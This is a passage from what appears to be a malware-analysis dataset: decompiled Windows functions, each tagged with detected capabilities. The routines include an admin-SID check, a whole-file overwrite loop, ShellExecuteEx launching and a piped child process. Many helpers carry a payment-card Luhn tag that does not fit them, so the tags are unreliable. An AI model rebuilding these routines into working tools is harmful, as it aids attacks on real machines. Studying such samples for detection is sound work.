        "decompiled_code": "\nvoid __cdecl fcn.00407a0a(uint arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int16_t *piVar3;\n    uint16_t uVar4;\n    int32_t unaff_EBX;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = *(unaff_EBX + 4);\n    fcn.00408008();\n    puVar2 = *(unaff_EBX + 0xc);\n    piVar3 = *(arg_ch + 0xc);\n    do {\n        uVar4 = *puVar2 - *piVar3;\n        uVar1 = uVar4 - var_4h;\n        piVar3 = piVar3 + 1;\n        var_4h = *puVar2 < uVar4 || uVar4 < uVar1;\n        *puVar2 = uVar1;\n        puVar2 = puVar2 + 1;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    if (arg_10h != NULL) {\n        *arg_10h = var_4h;\n    }\n    fcn.004080e3();\n    fcn.00407951();\n    fcn.004080e3();\n    return;\n}\n",
        "token_count": 326
    },
    "004086b7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004086b7(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_ESI;\n    bool bVar5;\n    uint32_t var_1ch;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_ch = 0;\n    fcn.00408fa9(*(unaff_ESI + 0x20), 0, *(unaff_ESI + 0x24));\n    pcVar1 = _sym.imp.KERNEL32.dll_SetFilePointerEx;\n    var_14h = 0;\n    var_10h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(arg_8h, 0, 0, &var_14h, 2);\n    iVar4 = var_10h;\n    if (iVar2 != 0) {\n        var_1ch = var_14h;\n        var_14h = 0;\n        var_10h = 0;\n        iVar2 = (*pcVar1)(arg_8h, 0, 0, &var_14h, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n        if (iVar2 != 0) {\n            uVar3 = *(unaff_ESI + 0x24);\n            if (iVar4 == 0) goto code_r0x00408752;\n            do {\n                do {\n                    iVar2 = (*pcVar1)(arg_8h, *(unaff_ESI + 0x20), uVar3, &var_8h, 0);\n                    if (iVar2 == 0) {\n                        return var_ch;\n                    }\n                    uVar3 = *(unaff_ESI + 0x24);\n                    if (var_8h < uVar3) {\n                        return var_ch;\n                    }\n                    bVar5 = var_1ch < uVar3;\n                    var_1ch = var_1ch - uVar3;\n                    iVar4 = iVar4 - bVar5;\n                } while (iVar4 != 0);\ncode_r0x00408752:\n            } while (uVar3 < var_1ch);\n            iVar4 = (*pcVar1)(arg_8h, *(unaff_ESI + 0x20), var_1ch, &var_8h, 0);\n            if ((iVar4 != 0) && (var_1ch <= var_8h)) {\n                var_ch = 1;\n            }\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 600
    },
    "00409139": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint16_t * fcn.00409139(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = param_1;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    do {\n        piVar2 = piVar2 + -1;\n        if (piVar2 == param_1) break;\n    } while (*piVar2 != param_2);\n    if (*piVar2 != param_2) {\n        piVar2 = NULL;\n    }\n    return piVar2;\n}\n",
        "token_count": 155
    },
    "00401bbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bbf(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint hostlong;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t arg_18h;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    iVar1 = fcn.0040530c();\n    hostlong = fcn.00403c7a();\n    iVar2 = fcn.00409041(0x10000);\n    fcn.00403955(arg_8h[3], 0x36, 0);\n    if (iVar1 != 0) {\n        if (iVar2 != 0) {\n            while (iVar4 = fcn.004035a4(iStack16),  iVar4 != 0) {\n                iStack16 = iStack16 + 1;\n                iVar4 = fcn.00405c9d();\n                if (iVar4 != 0) {\n                    uVar6 = arg_8h[4];\n                    uVar5 = arg_8h[3];\n                    uVar3 = *arg_8h;\n                    iVar4 = iVar1;\n                    arg_8h_00 = fcn.00401706(hostlong);\n                    iVar4 = fcn.00405840(arg_8h_00, uVar3, uVar5, uVar6, iVar4);\n                    if (iVar4 != 0) {\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                    }\n                    iVar4 = arg_8h[1];\n                    if (iVar4 != 0) {\n                        uVar6 = arg_8h[4];\n                        uVar5 = arg_8h[3];\n                        arg_18h = iVar1;\n                        uVar3 = fcn.00401706(hostlong);\n                        iVar4 = fcn.00405840(uVar3, iVar4, uVar5, uVar6, arg_18h);\n                        if (iVar4 != 0) {\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n                        }\n                    }\n                }\n            }\n            fcn.0040542b();\n        }\n        fcn.004052de();\n    }\n    if (iVar2 != 0) {\n        fcn.004090a1(iVar2);\n    }\n    fcn.00403955(arg_8h[3], 0x37, 0);\n    fcn.004090a1(arg_8h);\n    return 0;\n}\n",
        "token_count": 576
    },
    "004022ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004022ee(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00406347(10, 0);\n    iVar1 = fcn.00406347(0x1c, 0);\n    var_4h = 0;\n    fcn.00403955(*(arg_8h + 0xc), 0x3d, 0);\n    if (iVar1 != 0) {\n        fcn.00403dc0(iVar1);\n        fcn.004039da(iVar1);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004035d2(&var_4h);\n        if (var_4h != 0) {\n            while (iVar1 = fcn.00405962(),  iVar1 == 0) {\n                fcn.00404dee(var_4h);\n                (*_sym.imp.KERNEL32.dll_Sleep)(500);\n            }\n            fcn.004090a1();\n        }\n        fcn.004039da(arg_8h_00);\n    }\n    fcn.00403955(*(arg_8h + 0xc), 0x3e, 0);\n    fcn.004090a1(arg_8h);\n    return 0;\n}\n",
        "token_count": 324
    },
    "00402876": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402876(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 0x14) != 0) {\n        fcn.004090a1(*(unaff_ESI + 0x14));\n    }\n    if (*(unaff_ESI + 0x18) != 0) {\n        fcn.004090a1(*(unaff_ESI + 0x18));\n    }\n    if (*(unaff_ESI + 0x20) != 0) {\n        fcn.004090a1(*(unaff_ESI + 0x20));\n    }\n    if (*(unaff_ESI + 0x24) != 0) {\n        fcn.004090a1(*(unaff_ESI + 0x24));\n    }\n    if (*(unaff_ESI + 0x1c) != 0) {\n        fcn.004090a1(*(unaff_ESI + 0x1c));\n    }\n    fcn.00408fa9();\n    return;\n}\n",
        "token_count": 231
    },
    "00402fc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402fc8(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    fcn.004090c6(arg_ch);\n    iVar1 = fcn.00409139(arg_ch, 0x5c);\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 2;\n    }\n    if ((*(arg_8h + 0xc) != 0) &&\n       ((iVar2 = fcn.00403711(arg_ch),  -1 < iVar2 || ((iVar1 != 0 && (iVar1 = fcn.00403711(iVar1),  -1 < iVar1)))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 173
    },
    "00403020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403020(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *unaff_EDI;\n    \n    iVar1 = fcn.00409139(arg_8h, 0x5c);\n    if ((iVar1 == 0) || (iVar1 = iVar1 + 2,  iVar1 == 0)) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.00409139(iVar1, 0x2e);\n        if (iVar2 != 0) {\n            iVar2 = iVar2 + 2;\n        }\n    }\n    if (*unaff_EDI == 0) {\ncode_r0x00403067:\n        if ((unaff_EDI[1] != 0) && (iVar2 != 0)) {\n            iVar2 = fcn.00403711(iVar2);\n            if (-1 < iVar2) goto code_r0x004030a4;\n        }\n        if (unaff_EDI[2] != 0) {\n            iVar2 = fcn.00403711(arg_8h);\n            if (-1 < iVar2) goto code_r0x004030a4;\n            if (iVar1 != 0) {\n                iVar1 = fcn.00403711(iVar1);\n                if (-1 < iVar1) goto code_r0x004030a4;\n            }\n        }\n        uVar4 = 1;\n    }\n    else {\n        if (iVar2 != 0) {\n            iVar3 = fcn.00403711(iVar2);\n            if (-1 < iVar3) goto code_r0x00403067;\n        }\ncode_r0x004030a4:\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 413
    },
    "0040313f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040313f(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    \n    if ((unaff_EDI < unaff_ESI[5]) && (unaff_ESI[4] < unaff_EDI || unaff_ESI[4] == unaff_EDI)) {\n        uVar1 = unaff_ESI[2];\n        if (unaff_ESI[3] < uVar1) {\n            fcn.00408ffc((uVar1 - unaff_ESI[5]) + unaff_EDI, uVar1, unaff_ESI[1] - uVar1);\n            unaff_ESI[2] = unaff_ESI[2] + (unaff_EDI - unaff_ESI[5]);\n        }\n        else {\n            fcn.00408ffc(*unaff_ESI, uVar1, unaff_ESI[3] - uVar1);\n            unaff_ESI[3] = unaff_ESI[3] + (*unaff_ESI - unaff_ESI[2]);\n            unaff_ESI[2] = *unaff_ESI;\n        }\n        unaff_ESI[5] = unaff_EDI;\n        unaff_ESI[1] = *unaff_ESI + unaff_EDI;\n        iVar2 = fcn.0040907a(*unaff_ESI);\n        if (iVar2 != 0) {\n            unaff_ESI[2] = unaff_ESI[2] + (iVar2 - *unaff_ESI);\n            unaff_ESI[3] = unaff_ESI[3] + (iVar2 - *unaff_ESI);\n            *unaff_ESI = iVar2;\n            unaff_ESI[1] = iVar2 + unaff_EDI;\n            unaff_ESI[5] = unaff_EDI;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 437
    },
    "004035a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004035a4(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *in_EAX;\n    \n    if ((in_EAX != NULL) && (-1 < arg_8h)) {\n        while ((*in_EAX != 0 && (iVar2 = arg_8h + -1,  arg_8h != 0))) {\n            do {\n                iVar1 = *in_EAX;\n                in_EAX = in_EAX + 1;\n                arg_8h = iVar2;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "004035d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004035d2(int16_t **arg_8h)\n\n{\n    int16_t *in_EAX;\n    int32_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    \n    iVar5 = 0;\n    piVar2 = *arg_8h;\n    if ((in_EAX == NULL) || (*in_EAX == 0)) {\n        bVar6 = true;\n    }\n    else {\n        if (piVar2 == NULL) {\n            iVar1 = fcn.004090c6();\n            piVar2 = fcn.00409041(iVar1 * 2 + 4);\n        }\n        else {\n            iVar5 = fcn.00403585();\n            iVar1 = fcn.004090c6();\n            piVar2 = fcn.0040907a(piVar2, (iVar1 + iVar5) * 2 + 4);\n        }\n        if (piVar2 != NULL) {\n            *arg_8h = piVar2;\n            piVar2 = piVar2 + iVar5;\n            do {\n                iVar4 = *in_EAX;\n                piVar3 = piVar2;\n                if (iVar4 != 0) goto code_r0x0040363a;\n                do {\n                    *piVar3 = 0;\n                    piVar2 = piVar3 + 1;\n                    for (; *in_EAX == 0x3b; in_EAX = in_EAX + 1) {\n                    }\n                    iVar4 = *in_EAX;\n                    if (iVar4 == 0) {\n                        *piVar2 = 0;\n                        piVar2 = piVar3 + 2;\n                        goto code_r0x00403685;\n                    }\ncode_r0x0040363a:\n                    piVar3 = piVar2;\n                } while (iVar4 == 0x3b);\n                if (iVar4 - 0x41U < 0x1a) {\n                    iVar4 = iVar4 + 0x20;\n                }\n                *piVar2 = iVar4;\n                piVar2 = piVar2 + 1;\n                in_EAX = in_EAX + 1;\n            } while( true );\n        }\ncode_r0x00403685:\n        bVar6 = piVar2 != NULL;\n    }\n    return bVar6;\n}\n",
        "token_count": 538
    },
    "00403698": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403698(int32_t *arg_8h, int16_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    iVar3 = 0;\n    iVar2 = *arg_8h;\n    if ((arg_ch == NULL) || (*arg_ch == 0)) {\n        bVar4 = true;\n    }\n    else {\n        iVar1 = fcn.00403585();\n        if (iVar2 == 0) {\n            iVar2 = fcn.00409041(iVar1 * 2 + 2);\n        }\n        else {\n            iVar3 = fcn.00403585();\n            iVar2 = fcn.0040907a(iVar2, (iVar1 + iVar3) * 2 + 2);\n        }\n        if (iVar2 != 0) {\n            *arg_8h = iVar2;\n            iVar2 = iVar2 + iVar3 * 2;\n            fcn.00408fd7(iVar2, arg_ch, iVar1 * 2 + 2);\n        }\n        bVar4 = iVar2 != 0;\n    }\n    return bVar4;\n}\n",
        "token_count": 268
    },
    "00403711": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403711(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int16_t *in_EDX;\n    int16_t iVar3;\n    int16_t *piVar4;\n    \n    iVar1 = 0;\n    if (in_EDX != NULL) {\n        while (iVar2 = *in_EDX,  piVar4 = arg_8h,  iVar2 != 0) {\n            for (; (iVar2 != 0 && (iVar3 = *piVar4,  iVar3 != 0)); piVar4 = piVar4 + 1) {\n                if (iVar3 - 0x41U < 0x1a) {\n                    iVar3 = iVar3 + 0x20;\n                }\n                if (iVar2 != iVar3) break;\n                in_EDX = in_EDX + 1;\n                iVar2 = *in_EDX;\n            }\n            if (*in_EDX == *piVar4) {\n                return iVar1;\n            }\n            iVar1 = iVar1 + 1;\n            do {\n                iVar2 = *in_EDX;\n                in_EDX = in_EDX + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    return -1;\n}\n",
        "token_count": 287
    },
    "00403a93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403a93(uint lpValueName, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *unaff_EDI;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(*unaff_EDI, lpValueName, 0, 1, arg_ch, in_EAX * 2);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*unaff_EDI);\n    return iVar1 == 0;\n}\n",
        "token_count": 116
    },
    "00403abe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403abe(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = fcn.0040905b(arg_ch + 1, 2);\n    iVar1 = arg_ch * 2;\n    arg_ch = arg_14h;\n    fcn.00408fd7(arg_8h_00, arg_8h, iVar1);\n    iVar1 = fcn.00403a18(0x80000001, arg_18h, arg_8h_00, arg_10h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00403a18(0x80000002, arg_18h, arg_8h_00, arg_10h);\n        if (iVar1 == 0) {\n            arg_ch = 0;\n        }\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004090a1(arg_8h_00);\n    }\n    return arg_ch;\n}\n",
        "token_count": 264
    },
    "00403b33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403b33(uint lpDst)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint arg_14h;\n    uint32_t uVar2;\n    uint lpSrc;\n    \n    uVar1 = fcn.00409041(in_EAX * 2 + 2);\n    arg_14h = fcn.00406347(0x28, 0);\n    uVar2 = fcn.00405ec2(lpDst, in_EAX, fcn.00403abe, arg_14h);\n    fcn.004039da(arg_14h);\n    if (uVar2 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(uVar1, lpDst, in_EAX + 1U);\n        if (in_EAX + 1U < uVar2) {\n            uVar2 = 0;\n        }\n        if (uVar2 == 0) {\n            fcn.0040927d(lpDst, uVar1);\n        }\n        else {\n            uVar2 = uVar2 - 1;\n        }\n    }\n    fcn.004090a1(uVar1);\n    return uVar2;\n}\n",
        "token_count": 274
    },
    "00403bb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403bb3(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t lpDst;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00402fb5(arg_8h);\n    lpDst = fcn.004092e1(arg_8h_00);\n    if (lpDst != 0) {\n        iVar1 = fcn.004090c6(lpDst);\n        iVar2 = fcn.00403b33(lpDst);\n        if (iVar2 == 0) {\n            iVar1 = iVar1 * 2;\n            iVar2 = lpDst;\n            do {\n                iVar1 = iVar1 * 2;\n                lpDst = fcn.0040907a(iVar2, iVar1 + 2);\n                if (lpDst == 0) {\n                    fcn.004090a1(iVar2);\n                    lpDst = 0;\n                    break;\n                }\n                iVar3 = fcn.00403b33(lpDst);\n                iVar2 = lpDst;\n            } while (iVar3 == 0);\n        }\n    }\n    fcn.004039da(arg_8h_00);\n    return lpDst;\n}\n",
        "token_count": 291
    },
    "00403c29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c29(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    arg_8h_00 = fcn.00406347(arg_8h, 0);\n    var_18h = &var_ch;\n    var_14h = 0;\n    var_10h = 0;\n    var_1ch = 0x40a3b4;\n    fcn.00405ab0();\n    uVar1 = fcn.0040620d(arg_8h_00, &var_1ch);\n    fcn.004039f9(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 193
    },
    "00403e9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e9e(uint arg_8h, uint arg_ch)\n\n{\n    uint pExecInfo;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    \n    fcn.00408fa9(&var_38h, 0, 0x38);\n    var_30h = arg_ch;\n    var_2ch = arg_8h;\n    pExecInfo = 0x3c;\n    var_20h = 1;\n    var_38h = 0x100;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    return;\n}\n",
        "token_count": 155
    },
    "00404281": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404281(uint noname_0, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((*arg_10h == 0x10) && (*(arg_10h + 0xb) == 0x76)) {\n        iVar1 = fcn.0040411d(1, *arg_14h, arg_ch, arg_14h[1], arg_14h[2]);\n        arg_14h[3] = arg_14h[3] + (0 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 144
    },
    "004043cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004043cc(void)\n\n{\n    int32_t lpSubKey;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpSubKey = fcn.00406347(0x24, &var_ch);\n    iVar1 = fcn.004090c6(lpSubKey);\n    var_4h = 0;\n    var_8h = 4;\n    iVar1 = fcn.00403a18(0x80000002, lpSubKey, lpSubKey + 2 + iVar1 * 2, &var_4h);\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    fcn.004039b7(lpSubKey, var_ch);\n    return var_4h;\n}\n",
        "token_count": 184
    },
    "00404428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404428(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint Name;\n    uint ReferencedDomainName;\n    uint peUse;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t *pSid2;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pSid1;\n    uint cchReferencedDomainName;\n    \n    var_18h = 0;\n    puVar4 = NULL;\n    cchReferencedDomainName = 0;\n    pSid1 = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_2_ = 0x500;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &var_1ch);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(var_1ch, 2, 0, cchReferencedDomainName, &cchReferencedDomainName);\n        puVar4 = fcn.00409041(cchReferencedDomainName);\n        iVar3 = (*pcVar1)(var_1ch, 2, puVar4, cchReferencedDomainName, &cchReferencedDomainName);\n        if (((iVar3 != 0) &&\n            (iVar3 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                               (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid1),  iVar3 != 0)) &&\n           (uVar5 = 0,  *puVar4 != 0)) {\n            pSid2 = puVar4 + 1;\n            do {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_EqualSid)(pSid1, *pSid2);\n                if (iVar3 != 0) {\n                    cchReferencedDomainName = 0x104;\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                      (0, puVar4[uVar5 * 2 + 1], &Name, &cchReferencedDomainName, &ReferencedDomainName\n                                       , &cchReferencedDomainName, &peUse);\n                    if ((iVar3 != 0) || (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 == 0x534)) {\n                        var_18h = 1;\n                    }\n                    break;\n                }\n                pSid2 = pSid2 + 2;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < *puVar4);\n        }\n    }\n    if (pSid1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid1);\n    }\n    if (puVar4 != NULL) {\n        fcn.004090a1(puVar4);\n    }\n    return var_18h;\n}\n",
        "token_count": 737
    },
    "00404b85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "write file on Windows",
            "create pipe",
            "create two anonymous pipes",
            "create a process with modified I/O handles and window",
            "write and execute a file",
            "write pipe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b85(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t iVar4;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t aiStack108 [2];\n    uint uStack100;\n    uint auStack96 [4];\n    uchar auStack80 [28];\n    uint uStack52;\n    ushort uStack48;\n    \n    uStack116 = 0;\n    uStack124 = 0;\n    uStack120 = fcn.00403bb3(0x29);\n    uStack136 = 0xffffffff;\n    uStack140 = 0xffffffff;\n    uStack132 = 0xffffffff;\n    uStack128 = 0xffffffff;\n    fcn.00408fa9(auStack80, 0, 0x44);\n    fcn.00408fa9(aiStack108, 0, 0xc);\n    fcn.00408fa9(auStack96, 0, 0x10);\n    uStack100 = 1;\n    aiStack108[0] = 0xc;\n    fcn.00403d4b(&uStack124, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CreatePipe;\n    iVar4 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreatePipe)(&uStack136, &uStack140, aiStack108);\n    if (iVar2 != 0) {\n        iVar2 = (*pcVar1)(&stack0xffffff6c, &stack0xffffff70, &uStack124, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_SetHandleInformation;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_SetHandleInformation)(iVar4, 1, 0);\n            if (iVar2 != 0) {\n                iVar2 = (*pcVar1)(unaff_ESI, 1, 0);\n                if (iVar2 != 0) {\n                    uStack48 = 0;\n                    auStack96[0] = 0x44;\n                    uStack52 = 0x101;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                                      (uStack136, 0, 0, 0, 1, 0, 0, 0, auStack96, &iStack112);\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.004090b5(arg_8h, &uStack128, 0);\n                        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar4, arg_8h, uVar3);\n                        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack132, 0xffffffff);\n                        fcn.00403d4b(&uStack140, 1);\n                        uStack132 = 1;\n                    }\n                }\n            }\n        }\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iStack112 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack112);\n    }\n    if (aiStack108[0] != 0) {\n        (*pcVar1)(aiStack108[0]);\n    }\n    if (unaff_EDI != -1) {\n        (*pcVar1)(unaff_EDI);\n    }\n    if (iVar4 != -1) {\n        (*pcVar1)(iVar4);\n    }\n    if (unaff_ESI != -1) {\n        (*pcVar1)(unaff_ESI);\n    }\n    if (unaff_EBX != -1) {\n        (*pcVar1)(unaff_EBX);\n    }\n    fcn.004039da(uStack136);\n    fcn.004039f9(arg_8h);\n    return uStack132;\n}\n",
        "token_count": 915
    },
    "00405840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405840(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int16_t *piVar5;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puVar2 = fcn.00409041(0x18);\n    iVar1 = *in_EAX;\n    if (iVar1 != 0) {\n        do {\n            if (iVar1 != 0x20) break;\n            in_EAX = in_EAX + 1;\n            iVar1 = *in_EAX;\n        } while (iVar1 != 0);\n        if (*in_EAX != 0) {\n            piVar3 = fcn.004092e1(in_EAX);\n            if (piVar3 != NULL) {\n                iVar4 = fcn.004090c6(piVar3);\n                for (piVar5 = piVar3 + iVar4 + -1; piVar3 < piVar5; piVar5 = piVar5 + -1) {\n                    if ((*piVar5 != 0x20) && (*piVar5 != 0x5c)) break;\n                    *piVar5 = 0;\n                }\n                if (puVar2 == NULL) {\n                    fcn.004090a1(piVar3);\n                }\n                else {\n                    puVar2[1] = arg_8h;\n                    *puVar2 = arg_ch;\n                    puVar2[2] = arg_10h;\n                    puVar2[4] = piVar3;\n                    puVar2[3] = arg_14h;\n                    puVar2[5] = 